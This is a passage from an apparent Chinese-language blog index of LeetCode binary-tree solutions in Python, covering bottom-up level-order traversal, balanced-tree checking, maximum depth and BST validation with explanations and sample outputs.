<span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root: TreeNode)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">        new_queue=Queue()</span><br><span class="line">        list_level=[]</span><br><span class="line">        <span class="comment"># 初始化队列</span></span><br><span class="line">        new_queue.put(root)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty():  </span><br><span class="line">            count =new_queue.qsize() <span class="comment"># 统计每层结点个数</span></span><br><span class="line">            tmp=[]</span><br><span class="line">            <span class="keyword">while</span> count: <span class="comment"># 使每层结点都出队，并让下一层结点入队</span></span><br><span class="line">                dequeue= new_queue.get()</span><br><span class="line">                tmp.append(dequeue.val)</span><br><span class="line">                <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                    new_queue.put(dequeue.left)</span><br><span class="line">                <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                    new_queue.put(dequeue.right)</span><br><span class="line">                count= count<span class="number">-1</span></span><br><span class="line">            list_level.append(tmp)</span><br><span class="line">        <span class="keyword">return</span> list_level[::<span class="number">-1</span>]</span><br><span class="line">                   </span><br><span class="line"></span><br><span class="line">root = [<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.levelOrder(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[[15, 7], [9, 20], [3]]</code></pre><h3 id="方法二：递归"><a href="#方法二：递归" class="headerlink" title="方法二：递归"></a>方法二：递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(index,r)</span>:</span></span><br><span class="line">            <span class="comment"># 假设res是[ [1],[2,3] ]， index是3，就再插入一个空list放到res中</span></span><br><span class="line">            <span class="keyword">if</span> len(res)&lt;index:</span><br><span class="line">                res.append([])</span><br><span class="line">            <span class="comment">#  将当前节点的值加入到res中，index代表当前层，假设index是3，节点值是99</span></span><br><span class="line">            <span class="comment"># res是[ [1],[2,3] [4] ]，加入后res就变为 [ [1],[2,3] [4,99] ]</span></span><br><span class="line">            res[index<span class="number">-1</span>].append(r.val)</span><br><span class="line">            <span class="comment"># 递归的处理左子树，右子树，同时将层数index+1</span></span><br><span class="line">            <span class="keyword">if</span> r.left:</span><br><span class="line">                dfs(index+<span class="number">1</span>,r.left)</span><br><span class="line">            <span class="keyword">if</span> r.right:</span><br><span class="line">                dfs(index+<span class="number">1</span>,r.right)</span><br><span class="line">        dfs(<span class="number">1</span>,root)</span><br><span class="line">        <span class="keyword">return</span> res[::<span class="number">-1</span>]</span><br><span class="line">root = [<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.levelOrder(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[[15, 7], [9, 20], [3]]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】110.平衡二叉树</title>
      <link href="2020/12/06/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-110.%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>2020/12/06/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-110.%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>自顶至底先序递归；自底至顶后序递归。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，判断它是否是高度平衡的二叉树</p><p>本题中，一棵高度平衡二叉树定义为：</p><pre><code>一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1 。</code></pre><p>示例 1：</p><pre><code>   3  /  \ 9   20    /  \   15  7输入：root = [3,9,20,null,null,15,7]输出：true</code></pre><p>示例2：</p><pre><code>      1     /  \    2   2   /  \  3   3 /  \4   4输入：root = [1,2,2,3,3,null,null,4,4]输出：false</code></pre><p>示例 3：</p><pre><code>输入：root = []输出：true</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h3 id="方法一：自顶向下的递归"><a href="#方法一：自顶向下的递归" class="headerlink" title="方法一：自顶向下的递归"></a>方法一：自顶向下的递归</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><blockquote><p>构造一个获取当前节点最大深度的方法 depth(root) ，通过比较此子树的左右子树的最大高度差abs(depth(root.left) - depth(root.right))，来判断此子树是否是二叉平衡树。若树的所有子树都平衡时，此树才平衡。</p></blockquote><h4 id="算法流程："><a href="#算法流程：" class="headerlink" title="算法流程："></a>算法流程：</h4><p><code>isBalanced(root)</code>：判断树<code>root</code>是否平衡</p><ul><li>特例处理：若root为空，直接返回true</li><li>返回值：所有子树都满足平衡树性质，因此以下三者使用与逻辑&amp;&amp;连接<ol><li><code>abs(self.depth(root.left)-self.depth(root.right))&lt;=1</code>：判断<strong>当前子树</strong>是否平衡树</li><li><code>self.isBalanced(root.left)</code>：先序遍历递归，判断<strong>当前子树的左子树</strong>是否是平衡树</li><li><code>self.isBalanced(root.right</code>：先序遍历递归，判断<strong>当前子树的右子树</strong>是否是平衡树</li></ol></li></ul><p><code>depth(root)</code>：计算树<code>root</code>的最大高度</p><ul><li>终止条件：当root为空，即越过叶子结点，返回高度0</li><li>返回值：返回左/右子树的最大高度加1</li></ul><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li><p>时间复杂度：$O(Nlog_2N)$：最差情况下，<code>isBalanced(root</code>遍历树的所有结点，占用$O(N)$；判断每个结点的最大高度<code>depth(root</code>需遍历<strong>各子树的所有结点</strong>，子树的结点数的复杂度为$O(log_2N)$</p></li><li><p>空间复杂度O(N)：最差情况下（树退化为链表），系统递归所需使用O(N)的栈空间</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isBalanced</span><span class="params">(self, root: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> abs(self.depth(root.left) - self.depth(root.right)) &lt;= <span class="number">1</span> <span class="keyword">and</span> self.isBalanced(root.left) <span class="keyword">and</span> self.isBalanced(root.right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">depth</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> max(self.depth(root.left), self.depth(root.right)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root =  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">4</span>,<span class="number">4</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.isBalanced(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>False</code></pre><h3 id="方法二：从底至顶（提前阻断）"><a href="#方法二：从底至顶（提前阻断）" class="headerlink" title="方法二：从底至顶（提前阻断）"></a>方法二：从底至顶（提前阻断）</h3><p>此方法为本题的最优解法，但“从底至顶”的思路不易第一时间想到。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>思路是对二叉树做先序遍历，从底至顶返回子树最大高度，若判定某子树不是平衡树则 “剪枝” ，直接向上返回。</p><h4 id="算法流程：-1"><a href="#算法流程：-1" class="headerlink" title="算法流程："></a>算法流程：</h4><p><code>recur(root)</code>：</p><ul><li><p>递归返回值：</p><ol><li>当结点<code>root</code>左/右子树的高度差&lt;2：返回以结点<code>root</code>为根结点的子树的最大高度，即结点<code>root</code>的左右子树中最大高度加1：（<code>max(left,right)+1</code>）</li><li>当结点<code>root</code>左/右子树的高度差$ \geq 2$：则返回-1，代表此子树不是平衡树</li></ol></li><li><p>递归终止条件</p><ol><li>当越过叶子结点，返回高度0</li><li>当左右子树高度left=-1时，代表此树的左（右）子树不是平衡树，因此直接返回-1</li></ol></li></ul><p><code>isBalanced(root)</code></p><ul><li>返回值：若$recur(root)!=-1$，则说明此树平衡返回true；否则返回false</li></ul><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>时间复杂度 O(N)： N为树的节点数；最差情况下，需要递归遍历树的所有节点。</p><p>空间复杂度 O(N)： 最差情况下（树退化为链表时），系统递归需要使用 O(N) 的栈空间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isBalanced</span><span class="params">(self, root: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">return</span> self.recur(root) != <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recur</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        left = self.recur(root.left)</span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">-1</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        right = self.recur(root.right)</span><br><span class="line">        <span class="keyword">if</span> right == <span class="number">-1</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> max(left, right) + <span class="number">1</span> <span class="keyword">if</span> abs(left - right) &lt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">    </span><br><span class="line">root =  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">4</span>,<span class="number">4</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.isBalanced(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>False</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】104.二叉树的最大深度</title>
      <link href="2020/12/03/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-104.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/"/>
      <url>2020/12/03/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-104.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>广度优先遍历，递归：深度优先遍历</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例：<br>给定二叉树 [3,9,20,null,null,15,7]，</p><pre><code>  3 / \9  20  /  \ 15   7</code></pre><p>返回它的最大深度 3 。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h3 id="方法一：递归法"><a href="#方法一：递归法" class="headerlink" title="方法一：递归法"></a>方法一：递归法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span><span class="params">(self, root: TreeNode)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        left=<span class="number">1</span>+self.maxDepth(root.left)</span><br><span class="line">        right=<span class="number">1</span>+self.maxDepth(root.right)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> left&lt;right:</span><br><span class="line">            <span class="keyword">return</span> right</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> left</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root =  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">5</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.maxDepth(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>3</code></pre><h3 id="方法二：BFS"><a href="#方法二：BFS" class="headerlink" title="方法二：BFS"></a>方法二：BFS</h3><p>利用广度优先搜索，每次出队每一层，并进行统计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span><span class="params">(self, root: TreeNode)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        new_deque=deque()</span><br><span class="line">        new_deque.append(root)</span><br><span class="line">        count=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> len(new_deque):</span><br><span class="line">            size=len(new_deque)</span><br><span class="line">            <span class="keyword">while</span> size&gt;<span class="number">0</span>:</span><br><span class="line">                cur=new_deque.popleft()</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> cur.left:</span><br><span class="line">                    new_deque.append(cur.left)</span><br><span class="line">                <span class="keyword">if</span> cur.right:</span><br><span class="line">                    new_deque.append(cur.right)</span><br><span class="line">                size=size<span class="number">-1</span></span><br><span class="line">            count=count+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line">root =  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">5</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.maxDepth(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>3</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】98.验证二叉搜索树</title>
      <link href="2020/12/01/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-98.%20%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
      <url>2020/12/01/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-98.%20%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>递归、深度优先遍历</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p><p>假设一个二叉搜索树具有如下特征：</p><ul><li>节点的左子树只包含小于当前节点的数。</li><li>节点的右子树只包含大于当前节点的数。</li><li>所有左子树和右子树自身必须也是二叉搜索树。</li></ul><p>示例 1:</p><pre><code>输入:    2   / \  1   3输出: true</code></pre><p>示例2：</p><pre><code>输入:    5   / \  1   4     / \    3   6输出: false解释: 输入为: [5,1,4,null,null,3,6]。     根节点的值为 5 ，但是其右子节点值为 4 。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span 